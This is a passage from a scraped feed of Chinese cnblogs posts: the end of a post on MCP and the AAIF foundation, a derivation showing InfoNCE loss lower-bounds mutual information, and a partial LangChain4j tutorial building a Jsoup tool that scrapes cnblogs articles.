MCP 的支持，因为标准不再属于某个单一竞争对手。</font></p></li><li><p><font face=\"微软雅黑 Light\" size=\"3\">统一战线： OpenAI 不仅加入了基金会，还捐赠了其 AGENTS.md 标准。这意味着行业正在走向融合——OpenAI 的代理定义规范与 MCP 的工具连接规范将在 AAIF 的框架下进行整合，形成一套完整的“代理技术栈”。</font></p></li></ul><p><font face=\"微软雅黑 Light\" size=\"3\"><br /></font></p><p><font face=\"微软雅黑 Light\" size=\"3\"><br /></font></p>\n</div>\n<div id=\"MySignature\">\n    <p>欢迎大家扫描下面二维码成为我的客户，扶你上云</p>\n<img src=\"https://images.cnblogs.com/cnblogs_com/shanyou/57459/o_220125090408_%E9%82%80%E8%AF%B7%E4%BA%8C%E7%BB%B4%E7%A0%81-258px.jpeg\" width=\"170\" />\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-01-02 22:34</span>&nbsp;\n<a href=\"https://www.cnblogs.com/shanyou\">张善友</a>&nbsp;\n阅读(<span id=\"post_view_count\">102</span>)&nbsp;\n评论(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n</div>"
    },
    {
      "title": "Contrastive Learning 对比学习 | InfoNCE loss 与互信息的数学关联",
      "link": "https://www.cnblogs.com/moonout/p/19432533",
      "published": "",
      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/moonout/p/19432533\" id=\"cb_post_title_url\" title=\"发布于 2026-01-02 20:07\">\n    <span>Contrastive Learning 对比学习 | InfoNCE loss 与互信息的数学关联</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                    <div id=\"cnblogs_post_description\" style=\"display: none;\">\n        \n        InfoNCE loss 可以表示互信息的下界：I(X;Y) ≥ log N - L_InfoNCE 。\n    </div>\n<div class=\"blogpost-body cnblogs-markdown\" id=\"cnblogs_post_body\">\n<br />\n<p>参考博客：<a href=\"https://blog.csdn.net/iiiiii11/article/details/154584585\" rel=\"noopener nofollow\" target=\"_blank\">CSDN | 【理论推导】互信息与 InfoNCE 损失：从公式推导理解对比学习的本质</a> ，感觉是讲的最清楚的一个博客。</p>\n<hr />\n<p></p><div class=\"toc\"><div class=\"toc-container-header\">目录</div><ul><li><a href=\"#1-infonce-loss-和互信息的数学形式\" rel=\"noopener nofollow\">1 InfoNCE loss 和互信息的数学形式</a><ul><li><a href=\"#11-互信息的数学形式\" rel=\"noopener nofollow\">1.1 互信息的数学形式</a></li><li><a href=\"#12-infonce-loss-的数学形式\" rel=\"noopener nofollow\">1.2 InfoNCE loss 的数学形式</a></li><li><a href=\"#13-为什么我们希望最大化--的互信息\" rel=\"noopener nofollow\">1.3 为什么我们希望最大化 <span class=\"math inline\">\\((X,Y)\\)</span> 的互信息</a></li></ul></li><li><a href=\"#2-infonce-loss-与互信息的数学关联\" rel=\"noopener nofollow\">2 InfoNCE loss 与互信息的数学关联</a></li><li><a href=\"#3-证明过程\" rel=\"noopener nofollow\">3 证明过程</a><ul><li><a href=\"#31-第一步证明使-infonce-loss-取值最小的-满足-\" rel=\"noopener nofollow\">3.1 第一步：证明使 InfoNCE loss 取值最小的 <span class=\"math inline\">\\(f(x,y)\\)</span>，满足 <span class=\"math inline\">\\(f(x, y) = \\log [p(y|x) / p(y)]\\)</span></a></li><li><a href=\"#32-第二步将以上--代入推导互信息下界\" rel=\"noopener nofollow\">3.2 第二步：将以上 <span class=\"math inline\">\\(f(x,y)\\)</span> 代入，推导互信息下界</a></li></ul></li></ul></div><p></p>\n<hr />\n<h2 id=\"1-infonce-loss-和互信息的数学形式\">1 InfoNCE loss 和互信息的数学形式</h2>\n<h3 id=\"11-互信息的数学形式\">1.1 互信息的数学形式</h3>\n<p>互信息 <span class=\"math inline\">\\(I(X,Y)\\)</span> 是信息论中的核心概念，用于衡量两个随机变量 <span class=\"math inline\">\\(X,Y\\)</span> 之间的依赖程度。</p>\n<p>从直观上理解，互信息回答了这样一个问题：知道一个变量 Y 后，我们对另一个变量 X 的不确定性减少了多少？如果 X 的不确定性减少较多，则代表 XY 之间的互信息较大（为正）；如果 X 的不确定性没有减少，则 XY 是相互独立的，即 <span class=\"math inline\">\\(P(X)P(Y) = P(X,Y)\\)</span>，XY 之间的互信息为 0。</p>\n<p>数学上，互信息有三种等价的定义方式：</p>\n<p>① 基于联合分布 <span class=\"math inline\">\\(p(x,y)\\)</span> 和边缘分布 <span class=\"math inline\">\\(p(x)p(y)\\)</span> 的 KL 散度的形式</p>\n<p></p><div class=\"math display\">\\[I(X;Y) = D_{KL}\\big(p(x,y) ~\\|~ p(x)p(y)\\big) = \\mathbb{E}_{p(x,y)}\\left[\\log\\frac{p(x,y)}{p(x)p(y)}\\right]\n\\]</div><p></p><p>这个形式直接体现了互信息的本质：它衡量的是联合分布 <span class=\"math inline\">\\(p(x,y)\\)</span> 与假设 X 和 Y 独立时的分布 <span class=\"math inline\">\\(p(x)p(y)\\)</span> 之间的差异。如果 X 和 Y 独立，这个差异为 0，否则为正数，差异越大说明两个变量关联越强。</p>\n<p>② 基于熵的形式</p>\n<p></p><div class=\"math display\">\\[I(X;Y) = H(X) - H(X|Y) = H(Y) - H(Y|X)\n\\]</div><p></p><p>这里 <span class=\"math inline\">\\(H(X)=\\int p(x)\\log p(x)\\)</span> 是 X 的熵（不确定性），<span class=\"math inline\">\\(H(X|Y)\\)</span> 是已知 Y 时 X 的条件熵，互信息则是不确定性的减少量。</p>\n<p>③ 基于条件概率的形式</p>\n<p></p><div class=\"math display\">\\[I(X;Y) = \\mathbb{E}_{p(x,y)}\\left[\\log\\frac{p(y|x)}{p(y)}\\right]\n\\]</div><p></p><p>这个形式在对比学习中特别有用，因为它直接表达了“在给定 x 的情况下，y 的概率相对于其先验概率的变化”。</p>\n<h3 id=\"12-infonce-loss-的数学形式\">1.2 InfoNCE loss 的数学形式</h3>\n<p>InfoNCE loss 是现代对比学习（Contrastive Learning）的核心。它的设计灵感来自一个简单的直觉：从一堆样本中，找出与给定样本 x 匹配的正样本 y。</p>\n<p>具体的，假设我们有一个正样本对 <span class=\"math inline\">\\((x, y)\\)</span>，比如同一张图片的两种不同数据增强结果，同时从数据集中随机采样 <span class=\"math inline\">\\(N-1\\)</span> 个负样本 <span class=\"math inline\">\\(y_2, y_3, ..., y_N\\)</span>。我们定义一个评分函数 <span class=\"math inline\">\\(f(x, y)\\)</span>（通常是神经网络）来衡量 x 和 y 的相似度。InfoNCE loss 的形式为：</p>\n<p></p><div class=\"math display\">\\[L = -\\mathbb{E}\\left[\\log\\frac{e^{f(x,y)}}{\\sum_{j=1}^{N} e^{f(x,y_j)}}\\right]\n\\]</div><p></p><p>其中，分子 <span class=\"math inline\">\\(e^{f(x,y)}\\)</span> 是正样本的得分，而分母 <span class=\"math inline\">\\(\\sum_{j=1}^{N} e^{f(x,y_j)}\\)</span> 是所有样本（1 个正样本 + N-1 个负样本）得分的总和。整个分式表示：给定 x 和 N 个候选 y，我们正确选出正样本 y 的概率。</p>\n<p>也可将其视为交叉熵损失（cross-entropy loss）的一个变种。交叉熵损失的形式如下：</p>\n<p></p><div class=\"math display\">\\[L_\\text{CE} = \\sum p(a)\\log \\hat p(a)\n\\]</div><p></p><p>其中，<span class=\"math inline\">\\(p(a)\\)</span> 为真是概率，而 <span class=\"math inline\">\\(\\hat p(a)\\)</span> 是我们估计的概率。在 InfoNCE loss 的 setting 中，真概率 <span class=\"math inline\">\\(p(x,y) = 1\\)</span>，而 <span class=\"math inline\">\\(p(x,y_j) = 0\\)</span>。</p>\n<h3 id=\"13-为什么我们希望最大化--的互信息\">1.3 为什么我们希望最大化 <span class=\"math inline\">\\((X,Y)\\)</span> 的互信息</h3>\n<p>在对比学习中，我们希望最大化正样本对的互信息，同时最小化正负样本之间的互信息。这迫使编码器提取出两个不同视图（view）的共享信息（比如同一张图片的不同数据增强版本、语言 / 视觉等不同的模态），这些信息通常对应于数据的内在语义，例如物体的类别、场景等，而忽略无关的噪声或增强引入的变化。</p>\n<p>在 <a href=\"https://www.cnblogs.com/moonout/tag/Skill%20Discovery/\" target=\"_blank\">skill discovery</a>（强化学习的一个子领域）中，我们希望最大化 skill z 和 state s 之间的互信息。从信息理论的角度，最大化 <span class=\"math inline\">\\(I(S;Z)\\)</span> 意味着，我们希望从状态 <span class=\"math inline\">\\(s\\)</span> 中尽可能多地获取关于技能 <span class=\"math inline\">\\(z\\)</span> 的信息。这确保了技能是“有区分度的”：看到智能体的行为，我们就能推断出它使用了哪个技能。</p>\n<h2 id=\"2-infonce-loss-与互信息的数学关联\">2 InfoNCE loss 与互信息的数学关联</h2>\n<p>核心结论：最小化 InfoNCE loss，等价于最大化互信息的一个下界。</p>\n<p>（互信息下界的含义是，互信息的取值将会大于这个值。从这个角度来说，下界的值越大，互信息的值就随之变大，所以，我们最小化 InfoNCE loss，相当于在推动互信息最大化。）</p>\n<p>具体来说，对于任意评分函数 <span class=\"math inline\">\\(f\\)</span>，有以下不等式成立：</p>\n<p></p><div class=\"math display\">\\[I(X;Y) \\geq \\log N - L\n\\]</div><p></p><p>其中，<span class=\"math inline\">\\(L\\)</span> 是我们模型的 InfoNCE loss，这个差值就是互信息的下界。</p>\n<h2 id=\"3-证明过程\">3 证明过程</h2>\n<p>证明过程可以分为两步：</p>\n<h3 id=\"31-第一步证明使-infonce-loss-取值最小的-满足-\">3.1 第一步：证明使 InfoNCE loss 取值最小的 <span class=\"math inline\">\\(f(x,y)\\)</span>，满足 <span class=\"math inline\">\\(f(x, y) = \\log [p(y|x) / p(y)]\\)</span></h3>\n<p>我们要证明：使 InfoNCE loss 最小的 <span class=\"math inline\">\\(f(x,y)\\)</span> 满足：</p>\n<p></p><div class=\"math display\">\\[f(x,y) = \\log\\frac{p(y|x)}{p(y)}\n\\]</div><p></p><p>我们考虑 InfoNCE loss 的期望形式：</p>\n<p></p><div class=\"math display\">\\[L = -\\mathbb{E}_{p(x,y)} \\left[\\log\\frac{e^{f(x,y)}}{\\sum_{j=1}^{N} e^{f(x,y_j)}}\\right]\n\\]</div><p></p><p>我们可以将这个损失看作一个分类问题：给定 x 和 N 个样本 <span class=\"math inline\">\\({y_1, y_2, \\cdots, y_N}\\)</span>，其中只有 <span class=\"math inline\">\\(y_1=y\\)</span> 是正样本，其余是负样本。模型的任务是选出正样本。</p>\n<p>对于固定的 x，最优的分类器应该给出真实的后验概率，即给定 x 后，y 为这个 x 的正样本的概率。那么，真实的后验概率是多少呢？</p>\n<p>根据贝叶斯定理，在给定 x 和 y 样本集合的情况下，第 k 个样本是正样本的概率为（这个没完全看懂）：</p>\n<p></p><div class=\"math display\">\\[p(\\text{第 k 个是正样本} | x, {y_{1\\cdots N}}) = \\frac{p(y_k|x) \\prod_{i\\neq k} p(y_i) }{ \\sum_{j=1}^{N} p(y_j|x) \\prod_{i\\neq j} p(y_i)}\n\\]</div><p></p><p>化简后得到：</p>\n<p></p><div class=\"math display\">\\[= \\frac{p(y_k|x)/p(y_k)}{\\sum_{j=1}^{N} p(y_j|x)/p(y_j)}\n\\]</div><p></p><p>关键观察：如果我们取 <span class=\"math inline\">\\(f(x,y) = \\log\\frac{p(y|x)}{p(y)} + c(x)\\)</span>，其中 <span class=\"math inline\">\\(c(x)\\)</span> 是只依赖于 x 的任意函数，那么：</p>\n<p></p><div class=\"math display\">\\[\\frac{e^{f(x,y_k)}}{\\sum_{j=1}^{N} e^{f(x,y_j)}} = \\frac{p(y_k|x)/p(y_k)}{\\sum_{j=1}^{N} p(y_j|x)/p(y_j)}\n\\]</div><p></p><p>这正是真实的后验分布。因此，这个 <span class=\"math inline\">\\(f(x,y)\\)</span> 取值使得模型的输出分布与真实分布完全一致，从而最小化 InfoNCE loss。</p>\n<p>为简便起见，我们通常取 <span class=\"math inline\">\\(c(x)=0\\)</span>，得到最优 <span class=\"math inline\">\\(f(x,y)\\)</span>：</p>\n<p></p><div class=\"math display\">\\[f^*(x,y) = \\log\\frac{p(y|x)}{p(y)}\n\\]</div><p></p><h3 id=\"32-第二步将以上--代入推导互信息下界\">3.2 第二步：将以上 <span class=\"math inline\">\\(f(x,y)\\)</span> 代入，推导互信息下界</h3>\n<p>现在我们将最优 <span class=\"math inline\">\\(f^*(x,y)\\)</span> 代入 InfoNCE loss：</p>\n<p></p><div class=\"math display\">\\[L_{\\text{min}} = -\\mathbb{E}\\left[\\log\\frac{e^{f^*(x,y)}}{\\sum_{j=1}^{N} e^{f^*(x,y_j)}}\\right]\n= -\\mathbb{E}\\left[\\log\\frac{\\frac{p(y|x)}{p(y)}}{\\sum_{j=1}^{N} \\frac{p(y_j|x)}{p(y_j)}}\\right]\n\\]</div><p></p><p>考虑互信息 <span class=\"math inline\">\\(I(X;Y)\\)</span> 的以下形式：</p>\n<p></p><div class=\"math display\">\\[I(X;Y) = \\mathbb{E}\\left[\\log\\frac{p(y|x)}{p(y)}\\right]\n\\]</div><p></p><p>现在，我们想建立 <span class=\"math inline\">\\(I(X;Y)\\)</span> 和 <span class=\"math inline\">\\(L_{\\text{min}}\\)</span> 的关系。通过巧妙的代数变换，把互信息拆开：</p>\n<p></p><div class=\"math display\">\\[I(X;Y) = \\mathbb{E}\\left[\\log\\frac{p(y|x)}{p(y)}\\right]\n= \\mathbb{E}\\left[\\log\\frac{\\frac{p(y|x)}{p(y)}}{\\frac{1}{N}\\sum_{j=1}^{N} \\frac{p(y_j|x)}{p(y_j)}}\\right] + \\mathbb{E}\\left[\\log\\left(\\frac{1}{N}\\sum_{j=1}^{N} \\frac{p(y_j|x)}{p(y_j)}\\right)\\right]\n\\]</div><p></p><p>第一项就是 <span class=\"math inline\">\\(-L_{\\text{min}}\\)</span> 吗？不完全是。实际上，<span class=\"math inline\">\\(-L_{\\text{min}}\\)</span> = 第一项 - log N：</p>\n<p></p><div class=\"math display\">\\[-L_{\\text{min}} = \\mathbb{E}\\left[\\log\\frac{\\frac{p(y|x)}{p(y)}}{\\sum_{j=1}^{N} \\frac{p(y_j|x)}{p(y_j)}}\\right]\n= \\mathbb{E}\\left[\\log\\frac{\\frac{p(y|x)}{p(y)}}{\\frac{1}{N}\\sum_{j=1}^{N} \\frac{p(y_j|x)}{p(y_j)}}\\right] - \\log N\n\\]</div><p></p><p>所以：</p>\n<p></p><div class=\"math display\">\\[I(X;Y) = (-L_{\\text{min}} + \\log N) + \\mathbb{E}\\left[\\log\\left(\\frac{1}{N}\\sum_{j=1}^{N} \\frac{p(y_j|x)}{p(y_j)}\\right)\\right]\n\\]</div><p></p><p>现在看最后一项：<span class=\"math inline\">\\(\\mathbb{E}\\left[\\log\\left(\\frac{1}{N}\\sum_{j=1}^{N} \\frac{p(y_j|x)}{p(y_j)}\\right)\\right]\\)</span></p>\n<p>由于对数函数是凹函数，根据琴生不等式（Jensen's Inequality）：</p>\n<p></p><div class=\"math display\">\\[\\mathbb{E}[\\log(Z)] \\leq \\log(\\mathbb{E}[Z])\n\\]</div><p></p><p>因此：</p>\n<p></p><div class=\"math display\">\\[\\mathbb{E}\\left[\\log\\left(\\frac{1}{N}\\sum_{j=1}^{N} \\frac{p(y_j|x)}{p(y_j)}\\right)\\right] \\leq \\log\\left(\\mathbb{E}\\left[\\frac{1}{N}\\sum_{j=1}^{N} \\frac{p(y_j|x)}{p(y_j)}\\right]\\right)\n\\]</div><p></p><p>我们计算这个 log 里面的期望：</p>\n<p></p><div class=\"math display\">\\[\\mathbb{E}\\left[\\frac{p(y_j|x)}{p(y_j)}\\right] = \\int p(y_j) \\cdot \\frac{p(y_j|x)}{p(y_j)} dy_j = \\int p(y_j|x) dy_j = 1\n\\]</div><p></p><p>期望 = 1。所以：</p>\n<p></p><div class=\"math display\">\\[\\log\\left(\\mathbb{E}\\left[\\frac{1}{N}\\sum_{j=1}^{N} \\frac{p(y_j|x)}{p(y_j)}\\right]\\right) = \\log(1) = 0\n\\]</div><p></p><p>代入上式 = 0，使用琴生不等式，因此：</p>\n<p></p><div class=\"math display\">\\[\\mathbb{E}\\left[\\log\\left(\\frac{1}{N}\\sum_{j=1}^{N} \\frac{p(y_j|x)}{p(y_j)}\\right)\\right] \\leq 0\n\\]</div><p></p><p>将上式 ≤ 0 代回原式：</p>\n<p></p><div class=\"math display\">\\[I(X;Y) \\geq \\log N - L_{\\text{min}}\n\\]</div><p></p><p>由于 <span class=\"math inline\">\\(f^*\\)</span> 是最优的，所以对于任意评分函数 <span class=\"math inline\">\\(f\\)</span>，有 <span class=\"math inline\">\\(L(f) \\geq L_{\\text{min}}\\)</span>，得到：</p>\n<p></p><div class=\"math display\">\\[I(X;Y) \\geq \\log N - L_{\\text{min}} \\geq \\log N - L(f)\n\\]</div><p></p><p>证毕：对于任意评分函数 <span class=\"math inline\">\\(f\\)</span>，<span class=\"math inline\">\\(\\log N - L(f)\\)</span> 是互信息 <span class=\"math inline\">\\(I(X;Y)\\)</span> 的一个下界。</p>\n<br />\n<br />\n\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-01-02 20:07</span>&nbsp;\n<a href=\"https://www.cnblogs.com/moonout\">MoonOut</a>&nbsp;\n阅读(<span id=\"post_view_count\">28</span>)&nbsp;\n评论(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n</div>"
    },
    {
      "title": "LangChain4j 工具调用实战",
      "link": "https://www.cnblogs.com/BNTang/p/19432093",
      "published": "",
      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/BNTang/p/19432093\" id=\"cb_post_title_url\" title=\"发布于 2026-01-02 15:32\">\n    <span>LangChain4j 工具调用实战</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                <div class=\"blogpost-body cnblogs-markdown\" id=\"cnblogs_post_body\">\n<p>你有没有遇到过这种场景：</p>\n<ul>\n<li>用户问 AI：\"帮我查下今天上海的天气\"</li>\n<li>AI 回答：\"抱歉，我无法获取实时信息。\"</li>\n</ul>\n<p><strong>问题的核心是：AI 没有工具。</strong>就像给你一双手脚，让你去盖房子，你也做不到。但如果给你一套工具箱，情况就完全不同了。</p>\n<p><strong>今天我们就来给 AI 装上一套工具箱</strong>，让它能够从博客园实时获取最新技术文章。</p>\n<h2 id=\"什么是工具调用\">什么是工具调用？</h2>\n<p>简单来说，工具调用就是让 AI 能够\"借用\"外部能力。</p>\n<p>这些能力包括但不限于：</p>\n<ul>\n<li>联网搜索</li>\n<li>调用第三方 API</li>\n<li>读写文件</li>\n<li>查询数据库</li>\n<li>执行代码</li>\n</ul>\n<p><strong>但有一个关键点要特别注意</strong>：</p>\n<p>工具调用 <strong>不是</strong> AI 自己去执行这些工具，而是 AI 说\"我需要调用 XX 工具\"，真正执行的是我们的应用程序。</p>\n<p>流程是这样的：</p>\n<pre><code>用户提问 → AI 分析意图 → AI 决定调用工具\n→ 我们的程序执行工具 → 把结果返回给 AI → AI 继续回答\n</code></pre>\n<h2 id=\"要实现的目标\">要实现的目标</h2>\n<p>让 AI 能够查询博客园用户的最新文章，并提取这些信息：</p>\n<ul>\n<li>文章标题</li>\n<li>文章链接</li>\n<li>发布日期</li>\n<li>摘要内容</li>\n<li>阅读数、评论数、推荐数</li>\n</ul>\n<p><strong>实现方案</strong>：用 Jsoup 抓取博客园页面，把数据整理后返回给 AI。</p>\n<h2 id=\"快速了解流程\">快速了解流程</h2>\n<p>完整流程其实很简单：</p>\n<ol>\n<li>用户提问 → 2. AI 分析意图 → 3. AI 决定调用工具 → 4. 程序执行工具 → 5. 结果返回给 AI → 6. AI 整理后回复用户</li>\n</ol>\n<p><strong>核心就是</strong>：AI 不直接调用工具，而是告诉我们的程序\"我需要调用这个工具\"，程序执行完后把结果给 AI，AI 再基于结果回答用户。</p>\n<blockquote>\n<p>想看详细的调用链路？文章最后有完整的时序图，包你一看就懂。</p>\n</blockquote>\n<h2 id=\"动手实现四步搞定\">动手实现（四步搞定）</h2>\n<h3 id=\"步骤-1引入依赖\">步骤 1：引入依赖</h3>\n<p>先在 <code>pom.xml</code> 中加入 Jsoup（网页爬虫库）：</p>\n<pre><code class=\"language-xml\">&lt;dependency&gt;\n    &lt;groupId&gt;org.jsoup&lt;/groupId&gt;\n    &lt;artifactId&gt;jsoup&lt;/artifactId&gt;\n    &lt;version&gt;1.20.1&lt;/version&gt;\n&lt;/dependency&gt;\n</code></pre>\n<h3 id=\"步骤-2编写工具类\">步骤 2：编写工具类</h3>\n<p>在 <code>tools</code> 包下创建一个工具类，用 <code>@Tool</code> 注解告诉 LangChain4j：\"这是一个工具\"。</p>\n<p><strong>⚠️ 重点</strong>：工具描述一定要写清楚，AI 能否正确调用工具全看这个描述！</p>\n<pre><code class=\"language-java\">/**\n * 博客园文章搜索工具\n * 用于从博客园抓取用户的最新文章信息\n *\n * @author BNTang\n */\n@Slf4j\npublic class CnblogsArticleTool {\n\n    /**\n     * 从指定用户的博客园主页获取最新的技术文章列表。\n     * 支持提取文章标题、链接、发布日期、摘要、阅读数、评论数和推荐数等信息。\n     *\n     * @param input 博客园用户名或URL，可选地附加\"|N\"来限制结果数量\n     * @return 技术文章列表的JSON格式，包含详细信息，若失败则返回错误信息\n     */\n    @Tool(name = \"cnblogsSearch\", value = \"\"\"\n            从博客园获取最新文章。输入可以是：\n            - 博客园用户名（例如：'someUser'）\n            - 完整的个人主页URL（例如：'https://www.cnblogs.com/someUser/'）\n            可选择性地附加'|N'来限制结果数量，例如：'someUser|5'。\n            返回包含标题、链接、日期、摘要、阅读数、评论数、推荐数的JSON数组。\n            \"\"\"\n    )\n    public String searchCnblogsArticles(@P(value = \"用户名或URL（可选地附加|限制数量）\") String input) {\n        if (input == null || input.trim().isEmpty()) {\n            return \"{\\\"error\\\":\\\"Empty input\\\"}\";\n        }\n\n        String[] parts = input.trim().split(\"\\\\|\", 2);\n        String target = parts[0].trim();\n        int limit = 10;\n        if (parts.length == 2) {\n            try {\n                limit = Math.max(1, Math.min(100, Integer.parseInt(parts[1].trim())));\n            } catch (NumberFormatException ignored) { /* keep default */ }\n        }\n\n        String url;\n        if (target.startsWith(\"http://\") || target.startsWith(\"https://\")) {\n            url = target;\n        } else {\n            url = \"https://www.cnblogs.com/\" + target + \"/\";\n        }\n\n        Document doc = fetchDocumentWithRetries(url, 3, 8000);\n        if (doc == null) {\n            return \"{\\\"error\\\":\\\"Failed to fetch or parse page\\\"}\";\n        }\n\n        // 选择博客文章的主容器\n        Elements dayElements = doc.select(\".day\");\n\n        List&lt;ArticleInfo&gt; results = new ArrayList&lt;&gt;();\n\n        for (Element dayEl : dayElements) {\n            if (results.size() &gt;= limit) {\n                break;\n            }\n\n            // 提取标题和链接\n            Element titleEl = dayEl.selectFirst(\".postTitle a, .postTitle2\");\n            if (titleEl == null) {\n                continue;\n            }\n\n            String title = titleEl.text().trim();\n            // 移除\"[置顶]\"标记\n            title = title.replaceAll(\"^\\\\[置顶]\\\\s*\", \"\");\n\n            String href = titleEl.absUrl(\"href\");\n            if (href.isEmpty()) {\n                href = titleEl.attr(\"href\").trim();\n            }\n\n            // 去重检查\n            boolean seen = false;\n            for (ArticleInfo r : results) {\n                if (r.url.equals(href)) {\n                    seen = true;\n                    break;\n                }\n            }\n            if (seen) {\n                continue;\n            }\n\n            // 提取日期\n            String date = \"\";\n            Element dateEl = dayEl.selectFirst(\".dayTitle a\");\n            if (dateEl != null) {\n                date = dateEl.text().trim();\n            }\n\n            // 提取摘要\n            String summary = \"\";\n            Element summaryEl = dayEl.selectFirst(\".c_b_p_desc, .postCon\");\n            if (summaryEl != null) {\n                summary = summaryEl.text().trim();\n                // 移除\"阅读全文\"链接文本\n                summary = summary.replaceAll(\"阅读全文$\", \"\").trim();\n                // 限制摘要长度\n                if (summary.length() &gt; 200) {\n                    summary = summary.substring(0, 200) + \"...\";\n                }\n            }\n\n            // 提取统计信息\n            String viewCount = \"0\";\n            String commentCount = \"0\";\n            String diggCount = \"0\";\n\n            Element postDesc = dayEl.selectFirst(\".postDesc\");\n            if (postDesc != null) {\n                Element viewEl = postDesc.selectFirst(\".post-view-count\");\n                if (viewEl != null) {\n                    viewCount = extractNumber(viewEl.text());\n                }\n\n                Element commentEl = postDesc.selectFirst(\".post-comment-count\");\n                if (commentEl != null) {\n                    commentCount = extractNumber(commentEl.text());\n                }\n\n                Element diggEl = postDesc.selectFirst(\".post-digg-count\");\n                if (diggEl != null) {\n                    diggCount = extractNumber(diggEl.text());\n                }\n            }\n\n            if (!title.isEmpty() &amp;&amp; !href.isEmpty()) {\n                results.add(new ArticleInfo(title, href, date, summary, viewCount, commentCount, diggCount));\n            }\n        }\n\n        if (results.isEmpty()) {\n            return \"{\\\"message\\\":\\\"未找到文章。\\\"}\";\n        }\n\n        StringBuilder sb = new StringBuilder();\n        sb.append(\"[\");\n        for (int i = 0; i &lt; results.size(); i++) {\n            ArticleInfo article = results.get(i);\n            sb.append(\"{\");\n            sb.append(\"\\\"title\\\":\").append(jsonEscape(article.title)).append(\",\");\n            sb.append(\"\\\"url\\\":\").append(jsonEscape(article.url)).append(\",\");\n            sb.append(\"\\\"date\\\":\").append(jsonEscape(article.date)).append(\",\");\n            sb.append(\"\\\"summary\\\":\").append(jsonEscape(article.summary)).append(\",\");\n            sb.append(\"\\\"viewCount\\\":\").append(article.viewCount).append(\",\");\n            sb.append(\"\\\"commentCount\\\":\").append(article.commentCount).append(\",\");\n            sb.append(\"\\\"diggCount\\\":\").append(article.diggCount);\n            sb.append(\"}\");\n            if (i &lt; results.size() - 1) {\n                sb.append(\",\");\n            }\n        }\n        sb.append(\"]\");\n        return sb.toString();\n    }\n\n    /**\n     * 带重试机制获取网页文档\n     *\n     * @param url         目标URL\n     * @param maxAttempts 最大尝试次数\n     * @param timeoutMs   超时时间（毫秒）\n     * @return Jsoup文档对象，失败返回null\n     */\n    private Document fetchDocumentWithRetries(String url, int maxAttempts, int timeoutMs) {\n        String userAgent = \"Mozilla/5.0 (compatible; Bot/1.0; +https://example.com/bot)\";\n        int attempt = 0;\n        while (attempt &lt; maxAttempts) {\n            attempt++;\n            try {\n                return Jsoup.connect(url)\n                        .userAgent(userAgent)\n                        .timeout(timeoutMs)\n                        .referrer(\"https://www.google.com\")\n                        .get();\n            } catch (IOException e) {\n                log.warn(\"第{}次尝试获取 {} 失败: {}\", attempt, url, e.getMessage());\n                try {\n                    Thread.sleep(500L * attempt);\n                } catch (InterruptedException ignored) {\n                    Thread.currentThread().interrupt();\n                    break;\n                }\n            }\n        }\n        log.error(\"所有尝试均失败，无法获取 {}\", url);\n        return null;\n    }\n\n    /**\n     * 从文本中提取数字\n     *\n     * @param text 包含数字的文本，如\"阅读(123)\"\n     * @return 提取的数字字符串\n     */\n    private String extractNumber(String text) {\n        if (text == null) {\n            return \"0\";\n        }\n        text = text.replaceAll(\"[^0-9]\", \"\");\n        return text.isEmpty() ? \"0\" : text;\n    }\n\n    /**\n     * JSON字符串转义\n     *\n     * @param s 待转义的字符串\n     * @return 转义后的JSON字符串\n     */\n    private String jsonEscape(String s) {\n        if (s == null) {\n            return \"\\\"\\\"\";\n        }\n        String escaped = s.replace(\"\\\\\", \"\\\\\\\\\")\n                .replace(\"\\\"\", \"\\\\\\\"\")\n                .replace(\"\\n\", \"\\\\n\")\n                .replace(\"\\r\", \"\\\\r\");\n        return \"\\\"\" + escaped + \"\\\"\";\n    }\n\n    /**\n     * 文章信息类\n     */\n    private static class ArticleInfo {\n        String title;\n        String url;\n        String date;\n        String summary;\n        String viewCount;\n        String commentCount;\n        String diggCount;\n\n        ArticleInfo(String title, String url, String date, String summary,\n                    String viewCount, String commentCount, String diggCount) {\n            this.title = title;\n            this.url = url;\n            this.date = date;\n            this.summary = summary;\n            this.viewCount = viewCount;\n            this.commentCount = commentCount;\n            this.diggCount = diggCount;\n        }\n    }\n}\n</code></pre>\n<p><strong>核心逻辑</strong>：</p>\n<ol>\n<li>解析用户输入（支持用户名或 URL）</li>\n<li>用 Jsoup 抓取博客园页面</li>\n<li>用 CSS 选择器提取文章信息</li>\n<li>返回 JSON 格式的结果</li>\n</ol>\n<h3 id=\"步骤-3把工具绑定到-ai-service\">步骤 3：把工具绑定到 AI Service</h3>\n<pre><code class=\"language-java\">public AiCodeHelperService aiCodeHelperService() {\n    ChatMemory chatMemory = MessageWindowChatMemory.withMaxMessages(10);\n\n    return AiServices.builder(AiCodeHelperService.class)\n            .chatModel(qwenChatModel)\n            .chatMemory(chatMemory)\n            .contentRetriever(contentRetriever)\n            .tools(new CnblogsArticleTool())  // ← 绑定工具\n            .build();\n}\n</code></pre>\n<p><img alt=\"\" src=\"https://img2024.cnblogs.com/blog/2105804/202601/2105804-20260102134201705-1158921879.png\" /></p>\n<h3 id=\"步骤-4测试一下\">步骤 4：测试一下</h3>\n<p>写个单元测试：</p>\n<pre><code class=\"language-java\">@Test\nvoid chatWithTools() {\n    String result = aiCodeHelperService.chat(\n        \"帮我查下博客园用户 BNTang 的最新文章\"\n    );\n    System.out.println(result);\n}\n</code></pre>\n<p><strong>关键来了</strong>，在工具方法里打断点，Debug 运行：</p>\n<p><img alt=\"\" src=\"https://img2024.cnblogs.com/blog/2105804/202601/2105804-20260102134527464-344030566.png\" /></p>\n<p><strong>你会看到断点真的停下来了！</strong></p>\n<p><img alt=\"\" src=\"https://img2024.cnblogs.com/blog/2105804/202601/2105804-20260102134605221-2143614017.png\" /></p>\n<p>这说明 <strong>AI 